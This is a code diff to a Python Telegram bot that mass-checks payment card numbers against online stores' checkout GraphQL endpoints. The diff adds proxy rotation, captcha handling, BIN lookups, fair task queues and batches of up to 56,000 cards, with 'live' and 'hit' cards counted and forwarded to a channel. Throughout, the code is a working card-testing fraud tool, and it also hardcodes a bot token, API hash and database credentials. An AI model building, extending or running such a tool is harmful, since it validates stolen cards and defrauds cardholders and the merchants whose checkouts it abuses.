@@ -10,7 +10,7 @@ from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQ
 from pyrogram.enums import ParseMode
 import os
 import time
-from datetime import datetime, timedelta
+from datetime import datetime, timedelta, timezone
 import threading
 from queue import Queue, Empty
 from concurrent.futures import ThreadPoolExecutor, as_completed
@@ -21,7 +21,7 @@ import aiofiles
 from motor.motor_asyncio import AsyncIOMotorClient
 from pymongo import MongoClient
 from bson import ObjectId
-from collections import defaultdict
+from collections import defaultdict, deque
 
 
 import nest_asyncio
@@ -32,13 +32,31 @@ BOT_TOKEN = "8435065448:AAF3deY52T_TRETXKPgZnqOaqyfHXzUVlZ4"
 API_ID = 23933044
 API_HASH = "6df11147cbec7d62a323f0f498c8c03a"
 ADMINS = [7125341830]
-MONGO_URL = "mongodb+srv://animepahe:animepahe@animepahe.o8zgy.mongodb.net/?retryWrites=true&w=majority"
+MONGO_URL = os.getenv(
+    "MONGO_URL",
+    "mongodb+srv://animepahe:animepahe@animepahe.o8zgy.mongodb.net/?retryWrites=true&w=majority"
+)
 HIT_CHANNEL = -1003805693108  # Channel for forwarding hits
 
 # Constants
 MAX_SITES_PER_USER = 500
 MAX_GLOBAL_SITES = 500
-WORKER_COUNT = 15
+MIN_SITE_PRODUCT_PRICE = 1.00
+MAX_SITE_PRODUCT_PRICE = 26.00
+WORKER_COUNT = int(os.getenv("WORKER_COUNT", "30"))
+PROXY_VALIDATION_URL = "https://httpbin.org/ip"
+PROXY_VALIDATION_TIMEOUT = 6
+PROXY_VALIDATION_CONCURRENCY = int(os.getenv("PROXY_VALIDATION_CONCURRENCY", "20"))
+SITE_CHECK_WORKERS = int(os.getenv("SITE_CHECK_WORKERS", "5"))
+PRODUCT_CACHE_TTL_SECONDS = 300
+BIN_CACHE_TTL_SECONDS = 86400
+MAX_MASS_CHECK_CARDS = int(os.getenv("MAX_MASS_CHECK_CARDS", "56000"))
+TASK_QUEUE_MAXSIZE = int(os.getenv("TASK_QUEUE_MAXSIZE", "20000"))
+RESULT_QUEUE_MAXSIZE = int(os.getenv("RESULT_QUEUE_MAXSIZE", "20000"))
+PROGRESS_UPDATE_EVERY = int(os.getenv("PROGRESS_UPDATE_EVERY", "25"))
+PROGRESS_UPDATE_MIN_INTERVAL = float(os.getenv("PROGRESS_UPDATE_MIN_INTERVAL", "1.0"))
+MAX_PENDING_TASKS_PER_USER = int(os.getenv("MAX_PENDING_TASKS_PER_USER", "50000"))
+MAX_TOTAL_PENDING_TASKS = int(os.getenv("MAX_TOTAL_PENDING_TASKS", "250000"))
 
 # Logging setup
 logging.basicConfig(
@@ -62,17 +80,39 @@ users_col = db['users']
 proxies_col = db['proxies']
 sites_col = db['sites']
 user_sites_col = db['user_sites']
+DB_AVAILABLE = True
+DB_ERROR_REASON = None
 
-# In-memory task tracking (instead of database)
-active_tasks = {}  # task_id -> task info
+# In-memory persistence fallback (used when MongoDB is unavailable)
+mem_users = {}                  # user_id -> user dict
+mem_user_proxies = defaultdict(set)   # user_id -> set(proxy)
+mem_user_sites = defaultdict(list)    # user_id -> list(site_entry)
+mem_global_sites = set()              # set(site_url)
+
+# In-memory task tracking
+active_tasks = {}  # legacy map kept for compatibility
+active_task_counters = defaultdict(lambda: {'queued': 0, 'processing': 0})
 task_stats = {}    # message_id -> task stats
 task_messages = {} # message_id -> message object
 task_users = {}    # message_id -> user_id
+product_cache = {} # normalized_site -> {"data": product_info, "expires_at": epoch}
+bin_cache = {}     # bin -> {"data": bin_info, "expires_at": epoch}
+user_name_cache = {}  # user_id -> first_name
+mchk_pref_sessions = {}  # pref_id -> {user_id, choice, event, created_at}
+mchk_captcha_pref_sessions = {}  # pref_id -> {user_id, choice, event, created_at}
+user_active_mchk_batches = defaultdict(set)  # user_id -> set(batch_id)
+mchk_batches = {}  # batch_id -> {user_id, msg_id, status, created_at}
+cancelled_mchk_batches = set()  # batch_ids cancelled by /stopmchk
+mchk_batch_captcha_cards = defaultdict(list)  # batch_id -> list of CAPTCHA_REQUIRED cc lines
 
 # Global queues
-TASK_QUEUE = asyncio.Queue()
-RESULT_QUEUE = asyncio.Queue()
+TASK_QUEUE = asyncio.Queue(maxsize=TASK_QUEUE_MAXSIZE)
+RESULT_QUEUE = asyncio.Queue(maxsize=RESULT_QUEUE_MAXSIZE)
 active_workers = []
+pending_user_tasks = defaultdict(deque)  # user_id -> deque[task]
+pending_users_rr = deque()               # round-robin users
+pending_users_set = set()                # fast membership for RR deque
+pending_tasks_total = 0
 
 # Placeholders for GraphQL queries (to be added manually)
 # QUERY_PROPOSAL_SHIPPING
@@ -221,17 +261,103 @@ class Utils:
 def parse_proxy(proxy_str):
     if not proxy_str:
         return None
-    
+
+    proxy_str = proxy_str.strip()
+
+    if proxy_str.startswith(("http://", "https://")):
+        parsed = urlparse(proxy_str)
+        if not parsed.hostname or not parsed.port:
+            return None
+        if parsed.username and parsed.password:
+            return f"http://{parsed.username}:{parsed.password}@{parsed.hostname}:{parsed.port}"
+        return f"http://{parsed.hostname}:{parsed.port}"
+
     parts = proxy_str.split(':')
-    
     if len(parts) == 2:
-        ip, port = parts
-        return f"http://{ip}:{port}"
-    elif len(parts) == 4:
-        ip, port, user, password = parts
-        return f"http://{user}:{password}@{ip}:{port}"
-    else:
-        return None
+        host, port = parts
+        return f"http://{host}:{port}"
+    if len(parts) == 4:
+        host, port, user, password = parts
+        return f"http://{user}:{password}@{host}:{port}"
+    return None
+
+def normalize_site_url(site_url):
+    """Normalize site URL to scheme+host for stable storage/cache keys."""
+    if not site_url:
+        return site_url
+    normalized = str(site_url).strip()
+    if not normalized.startswith(('http://', 'https://')):
+        normalized = f"https://{normalized}"
+    parsed = urlparse(normalized)
+    if not parsed.netloc:
+        return normalized.rstrip('/')
+    return f"{parsed.scheme or 'https'}://{parsed.netloc.lower()}".rstrip('/')
+
+def validate_proxy_format(proxy_str):
+    """Validate and normalize proxy format for storage."""
+    if not proxy_str:
+        return False, None, "Empty proxy"
+
+    proxy_raw = str(proxy_str).strip()
+    host = ""
+    port = None
+    username = None
+    password = None
+
+    try:
+        if proxy_raw.startswith(("http://", "https://")):
+            parsed = urlparse(proxy_raw)
+            host = parsed.hostname or ""
+            port = parsed.port
+            username = parsed.username
+            password = parsed.password
+        else:
+            parts = proxy_raw.split(':')
+            if len(parts) == 2:
+                host, port = parts[0].strip(), parts[1].strip()
+            elif len(parts) == 4:
+                host, port, username, password = [p.strip() for p in parts]
+            else:
+                return False, None, "Expected IP:PORT or IP:PORT:USER:PASS"
+
+        if not host:
+            return False, None, "Missing proxy host"
+
+        if isinstance(port, str):
+            if not port.isdigit():
+                return False, None, "Invalid port"
+            port = int(port)
+        if not isinstance(port, int) or port < 1 or port > 65535:
+            return False, None, "Port must be between 1 and 65535"
+
+        if (username and not password) or (password and not username):
+            return False, None, "Both username and password are required"
+
+        if username and password:
+            normalized = f"{host}:{port}:{username}:{password}"
+        else:
+            normalized = f"{host}:{port}"
+
+        return True, normalized, None
+    except Exception:
+        return False, None, "Invalid proxy format"
+
+async def validate_proxy_connection(proxy_str):
+    """Validate that a proxy is reachable."""
+    proxy = parse_proxy(proxy_str)
+    if not proxy:
+        return False, "Invalid proxy format"
+
+    connector = aiohttp.TCPConnector(ssl=False)
+    timeout = aiohttp.ClientTimeout(total=PROXY_VALIDATION_TIMEOUT)
+    try:
+        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+            async with session.get(PROXY_VALIDATION_URL, proxy=proxy) as resp:
+                if resp.status == 200:
+                    return True, "OK"
+                return False, f"HTTP {resp.status}"
+    except Exception as e:
+        return False, f"Unreachable ({type(e).__name__})"
 
 def is_captcha_required(response_text):
     if not response_text:
@@ -275,8 +401,13 @@ async def make_graphql_request_with_captcha_handling(
 
 async def fetch_products(domain, proxy_str=None):
     try:
-        if not domain.startswith('http'):
-            domain = "https://" + domain
+        domain = normalize_site_url(domain)
+
+        cache_key = domain.lower()
+        cached_product = product_cache.get(cache_key)
+        now_ts = time.time()
+        if cached_product and cached_product.get("expires_at", 0) > now_ts:
+            return dict(cached_product["data"])
         
         connector = aiohttp.TCPConnector(ssl=False)
         timeout = aiohttp.ClientTimeout(total=10)
@@ -325,6 +456,10 @@ async def fetch_products(domain, proxy_str=None):
                     continue
         
         if isinstance(min_product, dict) and min_product.get('variant_id'):
+            product_cache[cache_key] = {
+                "data": min_product,
+                "expires_at": now_ts + PRODUCT_CACHE_TTL_SECONDS
+            }
             return min_product
         else:
             return False, "No Valid Products"
@@ -378,15 +513,39 @@ def parse_cc_string(cc_string):
         'cvv': parts[3].strip()
     }
 
-def get_bin_info(bin_number):
-    """Get BIN information from antipublic API"""
+def parse_cc_from_any_line(line):
+    """Extract and normalize CC data from mixed line formats."""
+    if not line:
+        return None
+
+    text = str(line).strip()
+    if not text:
+        return None
+
+    match = re.search(r'(\d{12,19})\D+(\d{1,2})\D+(\d{2,4})\D+(\d{3,4})', text)
+    if not match:
+        return None
+
+    cc, mm, yy, cvv = match.groups()
     try:
-        import requests
-        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=5)
-        if response.status_code == 200:
-            return response.json()
-    except:
-        pass
+        mm_i = int(mm)
+    except ValueError:
+        return None
+    if mm_i < 1 or mm_i > 12:
+        return None
+
+    mm = f"{mm_i:02d}"
+    if len(yy) == 2:
+        yy = f"20{yy}"
+    elif len(yy) != 4:
+        return None
+
+    if len(cvv) < 3 or len(cvv) > 4:
+        return None
+
+    return f"{cc}|{mm}|{yy}|{cvv}"
+
+def get_default_bin_info(bin_number):
     return {
         "bin": bin_number,
         "brand": "UNKNOWN",
@@ -397,6 +556,338 @@ def get_bin_info(bin_number):
         "level": "UNKNOWN",
         "type": "UNKNOWN"
     }
+
+async def get_bin_info(bin_number):
+    """Get BIN information asynchronously with cache."""
+    now_ts = time.time()
+    cached = bin_cache.get(bin_number)
+    if cached and cached.get("expires_at", 0) > now_ts:
+        return cached["data"]
+
+    try:
+        timeout = aiohttp.ClientTimeout(total=5)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as response:
+                if response.status == 200:
+                    data = await response.json()
+                    bin_cache[bin_number] = {
+                        "data": data,
+                        "expires_at": now_ts + BIN_CACHE_TTL_SECONDS
+                    }
+                    return data
+    except Exception:
+        pass
+    fallback = get_default_bin_info(bin_number)
+    bin_cache[bin_number] = {
+        "data": fallback,
+        "expires_at": now_ts + BIN_CACHE_TTL_SECONDS
+    }
+    return fallback
+
+def register_queued_tasks(user_id, count=1):
+    if count <= 0:
+        return
+    counters = active_task_counters[user_id]
+    counters['queued'] += count
+
+def decrement_queued_tasks(user_id, count=1):
+    if count <= 0:
+        return
+    counters = active_task_counters.get(user_id)
+    if not counters:
+        return
+    counters['queued'] = max(0, counters['queued'] - count)
+    if counters['queued'] <= 0 and counters['processing'] <= 0:
+        active_task_counters.pop(user_id, None)
+
+def mark_task_processing(user_id):
+    counters = active_task_counters[user_id]
+    if counters['queued'] > 0:
+        counters['queued'] -= 1
+    counters['processing'] += 1
+
+def mark_task_done(user_id):
+    counters = active_task_counters.get(user_id)
+    if not counters:
+        return
+    if counters['processing'] > 0:
+        counters['processing'] -= 1
+    if counters['queued'] <= 0 and counters['processing'] <= 0:
+        active_task_counters.pop(user_id, None)
+
+def get_active_task_stats(user_id):
+    counters = active_task_counters.get(user_id, {'queued': 0, 'processing': 0})
+    queued = max(0, counters.get('queued', 0))
+    processing = max(0, counters.get('processing', 0))
+    return {
+        "active_total": queued + processing,
+        "active_queued": queued,
+        "active_processing": processing
+    }
+
+def utcnow():
+    return datetime.now(timezone.utc)
+
+def set_db_unavailable(error):
+    """Switch to memory fallback when DB is unreachable."""
+    global DB_AVAILABLE, DB_ERROR_REASON
+    DB_AVAILABLE = False
+    DB_ERROR_REASON = str(error)
+
+def get_memory_user_doc(user_id):
+    user = mem_users.get(user_id)
+    if not user:
+        return None
+    return dict(user)
+
+def get_memory_site_doc(user_id):
+    sites = mem_user_sites.get(user_id, [])
+    if not sites:
+        return None
+    normalized = []
+    for entry in sites:
+        normalized.append(dict(entry) if isinstance(entry, dict) else entry)
+    return {'user_id': user_id, 'sites': normalized}
+
+def get_memory_all_user_site_docs():
+    docs = []
+    for uid, sites in mem_user_sites.items():
+        normalized = []
+        for entry in sites:
+            normalized.append(dict(entry) if isinstance(entry, dict) else entry)
+        docs.append({'user_id': uid, 'sites': normalized})
+    return docs
+
+def filter_sites_by_price_range(sites):
+    """Keep only site entries with price in configured range."""
+    filtered = []
+    removed = 0
+    for entry in sites or []:
+        if not isinstance(entry, dict):
+            removed += 1
+            continue
+
+        url = entry.get('url')
+        if not url:
+            removed += 1
+            continue
+
+        try:
+            price = float(str(entry.get('price', '')).replace(',', '').strip())
+        except Exception:
+            removed += 1
+            continue
+
+        if price < MIN_SITE_PRODUCT_PRICE or price > MAX_SITE_PRODUCT_PRICE:
+            removed += 1
+            continue
+
+        normalized_entry = dict(entry)
+        normalized_entry['url'] = normalize_site_url(url)
+        normalized_entry['price'] = f"{price:.2f}"
+        filtered.append(normalized_entry)
+    return filtered, removed
+
+def remove_user_from_round_robin(user_id):
+    if user_id not in pending_users_set:
+        return
+    pending_users_set.discard(user_id)
+    try:
+        pending_users_rr.remove(user_id)
+    except ValueError:
+        pass
+
+def register_mchk_batch(user_id, batch_id, msg_id):
+    user_active_mchk_batches[user_id].add(batch_id)
+    mchk_batches[batch_id] = {
+        'user_id': user_id,
+        'msg_id': msg_id,
+        'status': 'active',
+        'created_at': time.time()
+    }
+
+def finalize_mchk_batch(batch_id):
+    info = mchk_batches.get(batch_id)
+    if not info:
+        cancelled_mchk_batches.discard(batch_id)
+        mchk_batch_captcha_cards.pop(batch_id, None)
+        return
+    user_id = info.get('user_id')
+    if user_id in user_active_mchk_batches:
+        user_active_mchk_batches[user_id].discard(batch_id)
+        if not user_active_mchk_batches[user_id]:
+            user_active_mchk_batches.pop(user_id, None)
+    mchk_batches.pop(batch_id, None)
+    cancelled_mchk_batches.discard(batch_id)
+    mchk_batch_captcha_cards.pop(batch_id, None)
+
+def cancel_user_mchk_batches(user_id, batch_ids=None):
+    """Cancel mchk batches for user and remove queued tasks."""
+    global pending_tasks_total
+
+    active_for_user = set(user_active_mchk_batches.get(user_id, set()))
+    if batch_ids is None:
+        batch_ids = active_for_user
+    else:
+        batch_ids = set(batch_ids) & active_for_user
+    if not batch_ids:
+        return {'cancelled_batches': [], 'removed_pending': 0, 'msg_ids': []}
+
+    for batch_id in batch_ids:
+        cancelled_mchk_batches.add(batch_id)
+        if batch_id in mchk_batches:
+            mchk_batches[batch_id]['status'] = 'cancelled'
+        user_active_mchk_batches[user_id].discard(batch_id)
+    if user_id in user_active_mchk_batches and not user_active_mchk_batches[user_id]:
+        user_active_mchk_batches.pop(user_id, None)
+
+    removed_pending = 0
+    user_queue = pending_user_tasks.get(user_id)
+    if user_queue:
+        kept_tasks = deque()
+        for task in user_queue:
+            if task.get('type') == 'mchk' and task.get('batch_id') in batch_ids:
+                removed_pending += 1
+            else:
+                kept_tasks.append(task)
+
+        if kept_tasks:
+            pending_user_tasks[user_id] = kept_tasks
+        else:
+            pending_user_tasks.pop(user_id, None)
+            remove_user_from_round_robin(user_id)
+
+    if removed_pending:
+        pending_tasks_total = max(0, pending_tasks_total - removed_pending)
+        decrement_queued_tasks(user_id, removed_pending)
+
+    msg_ids = [mchk_batches[b]['msg_id'] for b in batch_ids if b in mchk_batches and mchk_batches[b].get('msg_id') is not None]
+    return {'cancelled_batches': list(batch_ids), 'removed_pending': removed_pending, 'msg_ids': msg_ids}
+
+def add_batch_captcha_card(batch_id, cc_line):
+    """Store CAPTCHA_REQUIRED card line for batch output file."""
+    if not batch_id or not cc_line:
+        return
+    cards = mchk_batch_captcha_cards[batch_id]
+    cards.append(cc_line)
+
+async def send_batch_captcha_file(user_id, batch_id):
+    """Send CAPTCHA_REQUIRED cards as txt for finished mchk batch."""
+    cards = mchk_batch_captcha_cards.get(batch_id, [])
+    if not cards:
+        return
+
+    file_path = f"captcha_required_{user_id}_{int(time.time())}.txt"
+    try:
+        async with aiofiles.open(file_path, 'w') as f:
+            await f.write("\n".join(cards))
+        await app.send_document(
+            chat_id=user_id,
+            document=file_path,
+            caption=f"🧩 CAPTCHA_REQUIRED CCs: {len(cards)}"
+        )
+    except Exception as e:
+        logger.error(f"Error sending CAPTCHA file for batch {batch_id}: {e}")
+    finally:
+        if os.path.exists(file_path):
+            os.remove(file_path)
+
+def get_user_enqueue_capacity(user_id):
+    """Current enqueue capacity for a user and global pool."""
+    global_left = MAX_TOTAL_PENDING_TASKS - pending_tasks_total
+    user_left = MAX_PENDING_TASKS_PER_USER - len(pending_user_tasks.get(user_id, ()))
+    return max(0, min(global_left, user_left))
+
+def enqueue_user_task(task):
+    """Queue task into fair per-user pending buffer."""
+    global pending_tasks_total
+    user_id = task.get('user_id')
+    if user_id is None:
+        return False, "Missing user_id"
+    if pending_tasks_total >= MAX_TOTAL_PENDING_TASKS:
+        return False, "System queue is full, try again later"
+
+    user_queue = pending_user_tasks[user_id]
+    if len(user_queue) >= MAX_PENDING_TASKS_PER_USER:
+        return False, f"Per-user queue limit reached ({MAX_PENDING_TASKS_PER_USER})"
+
+    user_queue.append(task)
+    pending_tasks_total += 1
+
+    if user_id not in pending_users_set:
+        pending_users_rr.append(user_id)
+        pending_users_set.add(user_id)
+    return True, None
+
+def dequeue_pending_task_round_robin():
+    """Pop one task fairly across users in round-robin order."""
+    global pending_tasks_total
+    if not pending_users_rr:
+        return None
+
+    user_id = pending_users_rr.popleft()
+    pending_users_set.discard(user_id)
+    user_queue = pending_user_tasks.get(user_id)
+    if not user_queue:
+        pending_user_tasks.pop(user_id, None)
+        return None
+
+    task = user_queue.popleft()
+    pending_tasks_total = max(0, pending_tasks_total - 1)
+
+    if user_queue:
+        pending_users_rr.append(user_id)
+        pending_users_set.add(user_id)
+    else:
+        pending_user_tasks.pop(user_id, None)
+    return task
+
+async def fair_task_dispatcher():
+    """Move tasks from fair pending queues into worker queue."""
+    logger.info("Fair dispatcher started")
+    while True:
+        task = dequeue_pending_task_round_robin()
+        if task is None:
+            await asyncio.sleep(0.01)
+            continue
+        await TASK_QUEUE.put(task)
+
+def should_update_progress(stats, force=False):
+    """Throttle task progress edits to avoid Telegram flood and slowdowns."""
+    checked = stats.get('checked', 0)
+    total = stats.get('total', 0)
+    if force or checked >= total:
+        stats['last_update_checked'] = checked
+        stats['last_update_at'] = time.time()
+        return True
+
+    now = time.time()
+    last_checked = stats.get('last_update_checked', 0)
+    last_update_at = stats.get('last_update_at', 0.0)
+    if (checked - last_checked) >= PROGRESS_UPDATE_EVERY or (now - last_update_at) >= PROGRESS_UPDATE_MIN_INTERVAL:
+        stats['last_update_checked'] = checked
+        stats['last_update_at'] = now
+        return True
+    return False
+
+async def get_cached_user_first_name(user_id):
+    cached_name = user_name_cache.get(user_id)
+    if cached_name:
+        return cached_name
+    first_name = 'User'
+    if DB_AVAILABLE:
+        try:
+            user = await users_col.find_one({'user_id': user_id})
+            first_name = user.get('first_name', 'User') if user else 'User'
+        except Exception as e:
+            set_db_unavailable(e)
+            user = get_memory_user_doc(user_id)
+            first_name = user.get('first_name', 'User') if user else 'User'
+    else:
+        user = get_memory_user_doc(user_id)
+        first_name = user.get('first_name', 'User') if user else 'User'
+    user_name_cache[user_id] = first_name
+    return first_name
 
 async def test_site_connection(site_url, proxy_str=None):
     """Test if a site is working by trying to add to cart and get session token"""
@@ -467,14 +958,13 @@ async def process_card(cc, mes, ano, cvv, site_url, user_id, proxy_str=None):
     receipt_id = None
     order_url = None
     
-    ourl = site_url if site_url.startswith('http') else f'https://{site_url}'
+    ourl = normalize_site_url(site_url)
     displayName = ""
     payment_identifier = None
     proxy = parse_proxy(proxy_str) if proxy_str else None
     checkpoint_data = None
     running_total = "0.00"
     max_retries = 1  # Retry once with new proxy if connection fails
-    original_proxy = proxy
 
     for attempt in range(max_retries + 1):
         try:
@@ -685,12 +1175,9 @@ async def process_card(cc, mes, ano, cvv, site_url, user_id, proxy_str=None):
 
                 graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'
                 
-                for i in range(2):
-                    response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
-                        session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
-                    )
-                    if i == 0:
-                        await asyncio.sleep(3)
+                response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
+                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
+                )
                 
                 if not response:
                     # Connection failed, try new proxy if available
@@ -1084,7 +1571,7 @@ async def process_card(cc, mes, ano, cvv, site_url, user_id, proxy_str=None):
                     'operationName': 'PollForReceipt'
                 }
 
-                await asyncio.sleep(3)
+                await asyncio.sleep(1.5)
                 
                 receipt_resp_json = None
                 final_text = ""
@@ -1095,7 +1582,7 @@ async def process_card(cc, mes, ano, cvv, site_url, user_id, proxy_str=None):
                     )
                     
                     if is_captcha_required(final_text):
-                        return True, "CARD_DECLINED", gateway, total_price, currency, receipt_id, order_url
+                        return False, "CAPTCHA_REQUIRED", gateway, total_price, currency, receipt_id, order_url
                     
                     try:
                         receipt_resp_json = json.loads(final_text)
@@ -1122,19 +1609,19 @@ async def process_card(cc, mes, ano, cvv, site_url, user_id, proxy_str=None):
                                 return True, code, gateway, total_price, currency, receipt_id, order_url
 
                             if receipt_data.get('__typename') in ['ProcessingReceipt', 'WaitingReceipt']:
-                                await asyncio.sleep(4)
+                                await asyncio.sleep(2)
                                 continue
                             
                     except Exception as e:
                         pass
                     
                     if 'WaitingReceipt' in final_text:
-                        await asyncio.sleep(4)
+                        await asyncio.sleep(2)
                     else:
                         break
                 
                 if 'CAPTCHA_REQUIRED' in final_text:
-                    return True, "CARD_DECLINED", gateway, total_price, currency, receipt_id, order_url
+                    return False, "CAPTCHA_REQUIRED", gateway, total_price, currency, receipt_id, order_url
                 
                 if 'WaitingReceipt' in final_text:
                     return False, "Change Proxy or Site", gateway, total_price, currency, receipt_id, order_url
@@ -1162,18 +1649,51 @@ async def process_card(cc, mes, ano, cvv, site_url, user_id, proxy_str=None):
 async def remove_dead_site(user_id, site_url):
     """Remove dead site from user's sites"""
     try:
-        await user_sites_col.update_one(
-            {'user_id': user_id},
-            {'$pull': {'sites': {'url': site_url}}}
-        )
+        site_url = normalize_site_url(site_url)
+        if DB_AVAILABLE:
+            try:
+                await user_sites_col.update_one(
+                    {'user_id': user_id},
+                    {'$pull': {'sites': {'url': site_url}}}
+                )
+            except Exception as db_error:
+                set_db_unavailable(db_error)
+        if user_id in mem_user_sites:
+            mem_user_sites[user_id] = [
+                s for s in mem_user_sites[user_id]
+                if not (isinstance(s, dict) and s.get('url') == site_url)
+            ]
+            if not mem_user_sites[user_id]:
+                mem_user_sites.pop(user_id, None)
     except Exception as e:
         logger.error(f"Error removing dead site: {e}")
 
 async def save_working_site(user_id, site_url, product_info):
     """Save working site with product info to user's sites"""
     try:
+        site_url = normalize_site_url(site_url)
+        try:
+            product_price = float(str(product_info.get('price', '0')).replace(',', '').strip())
+        except Exception:
+            return False, "Invalid product price"
+
+        if product_price < MIN_SITE_PRODUCT_PRICE:
+            return False, f"Cheapest product ${product_price:.2f} is below ${MIN_SITE_PRODUCT_PRICE:.2f}"
+
+        if product_price > MAX_SITE_PRODUCT_PRICE:
+            return False, f"Cheapest product ${product_price:.2f} is above ${MAX_SITE_PRODUCT_PRICE:.2f}"
+
         # Check if user already has max sites
-        user_sites_doc = await user_sites_col.find_one({'user_id': user_id})
+        user_sites_doc = None
+        if DB_AVAILABLE:
+            try:
+                user_sites_doc = await user_sites_col.find_one({'user_id': user_id})
+            except Exception as db_error:
+                set_db_unavailable(db_error)
+                user_sites_doc = get_memory_site_doc(user_id)
+        else:
+            user_sites_doc = get_memory_site_doc(user_id)
+
         current_count = len(user_sites_doc.get('sites', [])) if user_sites_doc else 0
         
         if current_count >= MAX_SITES_PER_USER:
@@ -1188,21 +1708,30 @@ async def save_working_site(user_id, site_url, product_info):
         # Add site
         site_entry = {
             'url': site_url,
-            'price': product_info.get('price', '0'),
+            'price': f"{product_price:.2f}",
             'variant_id': product_info.get('variant_id'),
             'product_link': product_info.get('link'),
-            'last_checked': datetime.utcnow()
+            'last_checked': utcnow()
         }
-        
-        await user_sites_col.update_one(
-            {'user_id': user_id},
-            {
-                '$addToSet': {
-                    'sites': site_entry
-                }
-            },
-            upsert=True
-        )
+
+        if DB_AVAILABLE:
+            try:
+                await user_sites_col.update_one(
+                    {'user_id': user_id},
+                    {
+                        '$addToSet': {
+                            'sites': site_entry
+                        }
+                    },
+                    upsert=True
+                )
+            except Exception as db_error:
+                set_db_unavailable(db_error)
+
+        # Always mirror in memory so fallback remains consistent.
+        user_sites = mem_user_sites[user_id]
+        if site_url not in [(s.get('url') if isinstance(s, dict) else str(s)) for s in user_sites]:
+            user_sites.append(site_entry)
         return True, "Site added successfully"
     except Exception as e:
         logger.error(f"Error saving working site: {e}")
@@ -1222,21 +1751,33 @@ async def update_task_progress(message_id, stats, start_time=None):
         elapsed = datetime.now() - start_time
         elapsed_str = str(elapsed).split('.')[0]  # Remove microseconds
         
-        # Get user info
+        # Get user info (cached)
         user_id = task_users.get(message_id)
-        user = await users_col.find_one({'user_id': user_id}) if user_id else None
-        user_name = user.get('first_name', 'User') if user else 'User'
+        user_name = await get_cached_user_first_name(user_id) if user_id else 'User'
         
-        # Create progress text
-        progress_text = f"""TASK
-USER: {user_name}
-START TIME: {start_time.strftime('%H:%M:%S')}
-ELAPSED: {elapsed_str}
+        duration_seconds = round(elapsed.total_seconds(), 1)
+        total_cards = stats.get('total', 0)
+        processed = stats.get('checked', 0)
+        live = stats.get('live', 0)
+        dead = stats.get('failed', 0)
+        hits = stats.get('hit', 0)
 
-CREATED BY @still_alivenow"""
+        progress_text = f"""💳 <b>CARD PROCESSOR</b>
+━━━━━━━━━━━━━━
+📂 Total Cards: {total_cards}
+📤 Processed: {processed}
+━━━━━━━━━━━━━━
+🎯 <b>RESULTS BREAKDOWN</b>
+• ✅ Live: {live}
+• ❌ Dead: {dead}
+• 💎 Hits: {hits}
+• 🧩 Captcha: {stats.get('captcha', 0)}
+━━━━━━━━━━━━━━
+⏱️ Duration: {duration_seconds}s
+👤 {user_name}"""
 
         # Create buttons
-        keyboard = InlineKeyboardMarkup([
+        keyboard_rows = [
             [
                 InlineKeyboardButton(f"TOTAL {stats.get('total', 0)}", callback_data="ignore"),
                 InlineKeyboardButton(f"CHECKED {stats.get('checked', 0)}", callback_data="ignore")
@@ -1247,9 +1788,18 @@ CREATED BY @still_alivenow"""
             ],
             [
                 InlineKeyboardButton(f"OTP {stats.get('otp', 0)}", callback_data="ignore"),
+                InlineKeyboardButton(f"CAPTCHA {stats.get('captcha', 0)}", callback_data="ignore"),
                 InlineKeyboardButton(f"FAILED {stats.get('failed', 0)}", callback_data="ignore")
             ]
-        ])
+        ]
+
+        batch_id = stats.get('batch_id')
+        if batch_id and processed < total_cards:
+            keyboard_rows.append([
+                InlineKeyboardButton("⏹️ Stop", callback_data=f"stopmchk_batch:{batch_id}")
+            ])
+
+        keyboard = InlineKeyboardMarkup(keyboard_rows)
         
         try:
             await message.edit_text(
@@ -1270,18 +1820,32 @@ async def task_worker(worker_id):
     """Worker to process tasks from queue"""
     logger.info(f"Worker {worker_id} started")
     while True:
+        user_id = None
+        processing_registered = False
         try:
             task = await TASK_QUEUE.get()
             if task is None:
+                TASK_QUEUE.task_done()
                 break
             
-            user_id = task['user_id']
+            user_id = task.get('user_id')
+            if user_id is None:
+                raise ValueError("Task missing user_id")
             cc_data = task['cc_data']
             site = task['site']
             proxy = task.get('proxy')
             message = task['message']
             task_type = task['type']
             task_id = task.get('task_id')
+            batch_id = task.get('batch_id')
+
+            if task_type == 'mchk' and batch_id in cancelled_mchk_batches:
+                decrement_queued_tasks(user_id, 1)
+                TASK_QUEUE.task_done()
+                continue
+
+            mark_task_processing(user_id)
+            processing_registered = True
             
             # Process the card
             start_time = time.time()
@@ -1293,7 +1857,7 @@ async def task_worker(worker_id):
             
             # Get BIN info
             bin_number = cc_data['cc'][:6]
-            bin_info = get_bin_info(bin_number)
+            bin_info = await get_bin_info(bin_number)
             
             # Prepare result
             result = {
@@ -1312,7 +1876,10 @@ async def task_worker(worker_id):
                 'process_time': process_time,
                 'message': message,
                 'task_type': task_type,
-                'task_id': task_id
+                'task_id': task_id,
+                'mchk_show_live_otp': task.get('mchk_show_live_otp', True),
+                'mchk_send_captcha_file': task.get('mchk_send_captcha_file', True),
+                'batch_id': batch_id
             }
             
             # Put result in queue
@@ -1322,6 +1889,8 @@ async def task_worker(worker_id):
             
         except Exception as e:
             logger.error(f"Worker {worker_id} error: {e}")
+            if processing_registered and user_id is not None:
+                mark_task_done(user_id)
             TASK_QUEUE.task_done()
 
 # Result handler
@@ -1330,10 +1899,13 @@ async def result_handler():
     logger.info("Result handler started")
     
     while True:
+        user_id = None
         try:
             result = await RESULT_QUEUE.get()
             
-            user_id = result['user_id']
+            user_id = result.get('user_id')
+            if user_id is None:
+                raise ValueError("Result missing user_id")
             cc = result['cc']
             full_cc = result['full_cc']
             status = result['status']
@@ -1349,10 +1921,16 @@ async def result_handler():
             original_message = result.get('message')
             task_type = result.get('task_type', 'single')
             task_id = result.get('task_id')
+            mchk_show_live_otp = result.get('mchk_show_live_otp', True)
+            mchk_send_captcha_file = result.get('mchk_send_captcha_file', True)
+            batch_id = result.get('batch_id')
+
+            if task_type == 'mchk' and batch_id in cancelled_mchk_batches:
+                mark_task_done(user_id)
+                RESULT_QUEUE.task_done()
+                continue
             
